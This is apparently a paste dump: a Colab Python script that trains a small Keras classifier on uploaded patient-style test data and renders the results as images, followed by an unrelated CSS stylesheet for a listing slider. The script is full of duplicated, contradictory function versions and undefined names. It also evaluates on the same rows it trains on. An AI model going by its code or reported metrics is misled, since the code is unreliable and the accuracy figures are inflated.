    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use red for class 0 and green for class 1
        if predictions[i] == 0:
            image[i, -1] = np.array([255, 0, 0])  # Red
        elif predictions[i] == 1:
            image[i, -1] = np.array([0, 128, 0])  # Green

    return image

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [np.min(data), np.max(data)], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data[:, j]), np.max(data[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image


def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    data_array = np.array(data)  # Convert data to a NumPy array

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    data_array = np.array(data)  # Convert data to a NumPy array

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    # Now, normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(image[:, -1])
    max_pixel_value = np.max(image[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(image[i, -1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Now, normalize the last column separately to achieve grayscale


        min_pixel_value = np.min(data[:, -1])
        max_pixel_value = np.max(data[:, -1])
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        min_pixel_value = np.min(data[i])
        max_pixel_value = np.max(data[i])
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image


def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(data[:, -1])
    max_pixel_value = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    # Convert data to a NumPy array
    data = np.array(data)

    num_rows, num_columns = data.shape
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(data[:, -1])
    max_pixel_value = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image


def create_imageN(data, predictions, label_colors=None):
    # Convert data to a NumPy array
    data = np.array(data)

    num_rows, num_columns = data.shape
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value_last = np.min(data[:, -1])
    max_pixel_value_last = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value_last, max_pixel_value_last], [0, 255]))
        image[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


    print(""**************************"",num_training_rows,""*******************"")

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    # for i, label in enumerate(y_train):
    #     for j in range(len(X_train[0])
    #         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
    #         image_training[i, j] = np.array([pixel_value] * 3)
    #         image_training[i, -1] = np.array([128, 128, 128])
    #     if label == 0:
    #         image_training[i, -1] = np.array([0, 128, 0])
    #     elif label == 1:
    #         image_training[i, -1] = np.array([255, 0, 0])



    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    for i, label in enumerate(y_train):
        for j in range(len(X_train[0])):
            pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)
        image_training[i, -1] = np.array([128, 128, 128])
        if label == 0:
            image_training[i, -1] = np.array([0, 128, 0])
        elif label == 1:
            image_training[i, -1] = np.array([255, 0, 0])


    return image_training








def create_imageN(data, predictions, label_colors=None):
    num_training_rows = 1  # Set the number of rows to 1
    image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(data[0][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[0, j] = np.array([pixel_value] * 3)

    image_training[0, -1] = np.array([128, 128, 128])  # Set a consistent gray background

    label = y_train[0]
    if label == 0:
        image_training[0, -1] = np.array([0, 128, 0])  # Green for label 0
    elif label == 1:
        image_training[0, -1] = np.array([255, 0, 0])  # Red for label 1

    return image_training

def create_imageN(data, predictions, label_colors=None):
    num_training_rows = len(data)  # Set the number of rows based on the data
    num_columns = len(data[0])

    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    for i in range(num_training_rows):
        # Normalize the first columns independently
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image_training[i, -1] = label_colors[predictions[i]]

    return image_training




# Load data from a file
#file_path = 'C:/Users/Hynek/Desktop/example4.txt'
from google.colab import files
uploaded = files.upload()

# Tento k√≥d otev≈ôe dialogov√© okno pro v√Ωbƒõr souboru z va≈°eho poƒç√≠taƒçe.
import io
import pandas as pd

# P≈ôedpokl√°d√°me, ≈æe jste nahr√°li CSV soubor
for fn in uploaded.keys():
  print('User uploaded file ""{name}"" with length {length} bytes'.format(
      name=fn, length=len(uploaded[fn])))
  path = io.BytesIO(uploaded[fn])  # Pro soubory, kter√© pot≈ôebuj√≠ b√Ωt ƒçteny jako bin√°rn√≠ objekty
  df = pd.read_csv(path)
  print(df.head())  # Vyp√≠≈°e prvn√≠ch pƒõt ≈ô√°dk≈Ø DataFrame


all_results = []
#with open(file_path, 'r') as file:
#    file_content = file.read()

# Execute the content as Python code
##exec(file_content)

import os
import shutil
import ast

for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl p≈ôesunut do {destination_path}"")

file_path = '/content/DATA2'  # Cesta k souboru
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)


# P≈ôevod na NumPy pole
A = np.array(A_list)

#exec(code)

# Now, all_results contains lists corresponding to each row in the CSV file
##print(all_results)

# Assign values to variables dynamically based on the rows of matrix A
for i, row in enumerate(A, start=1):
    globals()[f""person{i}_results""] = list(row)

# Print the assigned variables
for i in range(1, len(A) + 1):
  #  print(f""person{i}_results {globals()[f'person{i}_results']}"")
    all_results.append(f""person{i}_results"")
##print(all_results)



result_variables = []

# Loop through the variable names and get the corresponding variables using globals()
for var_name in all_results:
    result_variables.append(globals()[var_name])

# Now, result_variables contains the variables with names specified in variable_names
#print(result_variables)

all_results = result_variables
new_persons_results = result_variables


# # Define the blood test results for sixteen persons
# person1_results = [80, 90, 100, 125, 120, 0]
# person2_results = [95, 105, 115, 110, 135, 1]
# person3_results = [110, 120, 130, 140, 150, 0]
# person4_results = [100, 110, 120, 130, 140, 1]
# person5_results = [105, 115, 100, 105, 110, 0]
# person6_results = [90, 110, 115, 95, 120, 1]
# person7_results = [116, 99, 106, 105, 119, 0]
# person8_results = [111, 93, 118, 118, 107, 1]
# person9_results = [107, 97, 105, 119, 98, 0]
# person10_results = [92, 108, 90, 117, 111, 1]
# person11_results = [118, 105, 103, 118, 99, 0]
# person12_results = [97, 115, 101, 101, 113, 1]
# person13_results = [95, 111, 93, 112, 120, 0]
# person14_results = [100, 112, 118, 109, 103, 1]
# person15_results = [113, 91, 94, 93, 99, 0]
# person16_results = [103, 92, 95, 110, 98, 1]

# # Combine the results into a list
# all_results = [person1_results, person2_results, person3_results, person4_results,
#                person5_results, person6_results, person7_results, person8_results,
#                person9_results, person10_results, person11_results, person12_results,
#                person13_results, person14_results, person15_results, person16_results]


# #all_results = [person1_results, person2_results]


# Extract the last column (0 or 1) as labels
labels = [results[-1] for results in all_results]

# Remove the last column from the dataset
data = [results[:-1] for results in all_results]

# Define the number of rows for training and testing
num_training_rows = 100
num_testing_rows = 100

# Split the data into training and testing datasets
#X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)

# Normalize the testing data using the min and max values of the training data
X_test_normalized = (X_test - min_values) / (max_values - min_values)


# Print normalized training data
print(""Normalized Training Data:"")
print(X_train_normalized)
print(""Adenormalized"",X_train_normalized*(max_values - min_values)+min_values,""Bdenormalized"")

# Define a simple neural network model
# model = tf.keras.Sequential([
#     tf.keras.layers.Dense(128, activation='relu', input_shape=(len(X_train[0]),)),
#     tf.keras.layers.Dense(64, activation='relu'),
#     tf.keras.layers.Dense(1, activation='sigmoid')
# ])

# # Compile the model
# model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])


import tensorflow as tf

# Vylep≈°en√Ω model
model = tf.keras.Sequential([
    tf.keras.layers.Dense(256, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(128, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dropout(0.3),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Pou≈æit√≠ Adam optimizer s learning rate schedulerem
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate=1e-3,
    decay_steps=10000,
    decay_rate=0.9
)
optimizer = tf.keras.optimizers.Adam(learning_rate=lr_schedule)

# Kompilace modelu
model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])


# Lists to store accuracy values
accuracy_history = []

# Create images for the training data
image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


min_pixel_value = np.min(X_train_normalized)
max_pixel_value = np.max(X_train_normalized)

# Populate image_training with consistent gray and red/green colors based on the labels in the last column
# for i, label in enumerate(y_train):
#     for j in range(len(X_train[0])
#         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#     if label == 0:
#         image_training[i, -1] = np.array([0, 128, 0])
#     elif label == 1:
#         image_training[i, -1] = np.array([255, 0, 0])



# Populate image_training with consistent gray and red/green colors based on the labels in the last column
for i, label in enumerate(y_train):
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])






from tqdm.notebook import tqdm_notebook


###ZDE VLOZTE DATA OD NOVYCH PACIENTU


# Train the model for 400 epochs
epochs = 138
# Assuming 'new_persons_results' is a list of new persons, where each person is represented as a list of features
new_persons_results = [
   # [101, 112],
   # [0.54422416, 0.02778176],
   # [22.57372914, 17.96922325],
#    [22.57372914, 17.96922325]
    # Add more new persons as needed
#          [23.65780072, 18.8599168 ],
#          [22.57372914, 17.96922325],
#          [32.55342397, 29.46365141],
#          [ 6.71803504, 25.70466547],
#          [ 6.71803504, 25.70466547],
#          [14.40191857, 16.77085649],
#          [17.45790731, 21.76521471],
#          [2110.02796947, 73.45445955],
#          [30.29513837, 62.90111289],
#          [15.1289778,  32.40267702],

 [23.65780072, 18.8599168 ],
 [22.57372914, 17.96922325],
 [32.55342397, 29.46365141],
 [ 6.71803504, 25.70466547],
 [14.40191857, 16.77085649],
 [17.45790731, 21.76521471],
 [20.02796947, 73.45445955],
 [26.2042, 10.6782],
 [35.7258, 82.8027],

]

import sys

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    accuracy_history.append(history.history['accuracy'][0])

    if epoch == 1:
        # Normalize the testing data
        X_test_normalized = (X_test - min_values) / (max_values - min_values)
        y_pred_after_2nd_epoch = model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch]
        image_testing_before_2nd_epoch = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=1):
            # Ensure that personNEW_results has the same number of features as the model expects
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""

            personNEW_results_normalized = (np.array(personNEW_results) - min_values) / (max_values - min_values)

            personNEW_prediction = model.predict(np.array([personNEW_results_normalized]))
            personNEW_label = 1 if personNEW_prediction >= 0.5 else 0
            y_pred_after_50_epochs = model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs]
            image_testing_after_50_epochs = create_image(X_test_normalized, y_pred_binary_after_50_epochs, label_colors_testing)

            # Create an image for the new person
            image_personNEW = create_imageN([personNEW_results_normalized], [personNEW_label], label_colors)

            # Display the images
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW)
            plt.title(f""New Person {idx}\nLabel: {personNEW_label}, Prediction: {personNEW_prediction}"")
            plt.axis(""off"")
            plt.show()


# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch)
plt.title(""Testing Data (2nd Epoch)"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs)
plt.title(f""Testing Data ({epochs} Epochs)"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW)
plt.title(f""New Person\nLabel: {personNEW_label},[{personNEW_prediction}]"")
plt.axis(""off"")

# Plot accuracy history
plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), accuracy_history, marker='o')
plt.title('Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Print normalized data
print(""Normalized PersonNEW Data:"")
print(personNEW_results_normalized)

plt.show()

print(""X_train before normalization:"")
print(X_train)
print(""X_test before normalization:"")
print(X_test)

import seaborn as sns


print(""KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"")
print(X_test)
print(""HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"")
print(X_train)
print(""LLLLLLLLLLLLLLLLLLLLLLLLLLLLL"")


# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix
# conf_matrix = confusion_matrix(y_train, y_pred_binary)
# print(conf_matrix)


from sklearn.metrics import confusion_matrix
from tensorflow.keras.utils import to_categorical

# # Normalize the training data
# min_values = np.min(np.concatenate([X_train, X_test], axis=0), axis=0)
# max_values = np.max(np.concatenate([X_train, X_test], axis=0), axis=0)
# X_train_normalized = (X_train - min_values) / (max_values - min_values)
# X_test_normalized = (X_test - min_values) / (max_values - min_values)

np.set_printoptions(threshold=np.inf, precision=4, suppress=True)


# # Assuming X_test_normalized and y_test are your test set data
# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix using the test set
# conf_matrix = confusion_matrix(y_test, y_pred_binary)
# print(conf_matrix)



# plt.figure(figsize=(6, 6))
# sns.heatmap(conf_matrix, annot=True, fmt=""d"", cmap=""Blues"", xticklabels=['Predicted 0', 'Predicted 1'], yticklabels=['Actual 0', 'Actual 1'])
# plt.xlabel(""Predicted Label"")
# plt.ylabel(""True Label"")
# plt.title(""Confusion Matrix"")
# plt.show()

# X_train = np.array(X_train)
# y_train_one_hot = np.array(y_train_one_hot)

# Rozd√Ñ‚Ä∫lenƒÇ¬≠ dat na trƒÇ¬©novacƒÇ¬≠ a testovacƒÇ¬≠ mnoƒπƒæiny
###X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

###X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_training_rows], labels[:num_training_rows], labels[:num_training_rows]
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

import numpy as np
import matplotlib.pyplot as plt
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import tensorflow as tf
import seaborn as sns

# Assuming data splitting and model definition have been done correctly

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Train the model
print(""Training Start"")
for epoch in tqdm_notebook(range(100), desc=""Training Progress""):
    model.fit(np.array(X_train_normalized), np.array(y_train), epochs=1, verbose=0)
print(""Training Complete"")

# Generate predictions from the model
predictions = (model.predict(X_test_normalized) > 0.5).astype(int)

# Convert y_test to a numpy array and then to binary labels
y_test_array = np.array(y_test)  # Convert y_test to a numpy array
y_test_binary = (y_test_array > 0.5).astype(int)  # Convert to binary

# Compute the confusion matrix
conf_matrix = confusion_matrix(y_test_binary, predictions)

# Evaluate the model's performance
accuracy = accuracy_score(y_test_binary, predictions)
precision = precision_score(y_test_binary, predictions)
recall = recall_score(y_test_binary, predictions)
f1 = f1_score(y_test_binary, predictions)

# Display the confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""Recall: {recall:.4f}"")
print(f""F1 Score: {f1:.4f}"")

print(f""Confusion Matrix2122:\n{conf_matrix}"")


import random

def find_best_pair(min_val, max_val, num_features, model, min_values, max_values):
    best_pair = None
    best_prediction = 1
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_normalized = (new_data - min_values) / (max_values - min_values)
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_normalized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction < best_prediction:
            best_prediction = prediction
            best_pair = new_data
    return best_pair, best_prediction



best_pair, best_prediction = find_best_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)


def find_worst_pair(min_val, max_val, num_features, model, min_values, max_values):
    worst_pair = None
    worst_prediction = 0
    for _ in range(1000):  # Number of iterations to find the best pair
        new_data = np.random.uniform(min_val, max_val, num_features)
        new_data_normalized = (new_data - min_values) / (max_values - min_values)
        
        # Suppress model output
        tf.get_logger().setLevel('ERROR')
        with tf.device('/CPU:0'):  # Ensure to run on CPU to minimize unwanted logs
            prediction = model.predict(np.array([new_data_normalized]), verbose=0)[0][0]
        tf.get_logger().setLevel('INFO')
        
        if prediction > worst_prediction:
            worst_prediction = prediction
            worst_pair = new_data
    return worst_pair, worst_prediction



worst_pair, worst_prediction = find_worst_pair(min_values, max_values, len(X_train[0]), model, min_values, max_values)


print(f""Best Pair: {best_pair}, Best Prediction: {best_prediction}"")
print(f""Worst Pair: {worst_pair}, Worst Prediction: {worst_prediction}"")
"
sXdSY7C9,Untitled,s-sols,CSS,Sunday 26th of May 2024 01:57:31 PM CDT,"@media screen and (min-width: 1200px) {
	body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider {
		height: 270px;
	}

		body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider img {
			margin: 0 2.5px;
		}
}

@media screen and (max-width: 1199px) and (min-width: 992px) {
	body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider {
		width: 100%;
		height: 227.02px;
	}

		body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider img {
			height: 227.02px;
		}
}

@media screen and (max-width: 991px) and (min-width: 768px) {
	body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider {
		width: 100%;
		height: 264.48px;
	}

		body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider img {
			height: 264.48px;
		}
}

@media screen and (max-width: 991px) {
	body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider .lp-listing-slide-wrap {
		width: 33.333%;
		float: left;
	}
}

@media screen and (max-width: 767px) {
	body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider {
		height: auto;
		aspect-ratio: 655 / 236.938;
	}

		body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider:not(:has(.slick-track)) .lp-listing-slide-wrap {
			padding: 0 2px;
		}


			body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider:not(:has(.slick-track)) .lp-listing-slide-wrap:nth-of-type(4) {
				opacity: 0;
			}
}

@media screen and (max-width: 479px) {
	body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider {
		aspect-ratio: 436 / 236.94;
	}

		body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider .lp-listing-slide-wrap {
			width: 50%;
			float: left;
		}

		body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider:not(:has(.slick-track)) .lp-listing-slide-wrap:nth-of-type(1n + 3) {
			display: none;
		}
}

@media screen and (max-width: 319px) {
	body.single-listing:is(.seraph-accel-js-lzl-ing, .seraph-accel-js-lzl-ing-ani) .lp-listing-top-title-header .lp-style3-header-wrap .lp-listing-slider:not(:has(.slick-track)) .lp-listing-slide-wrap {
		padding: 0;
	}

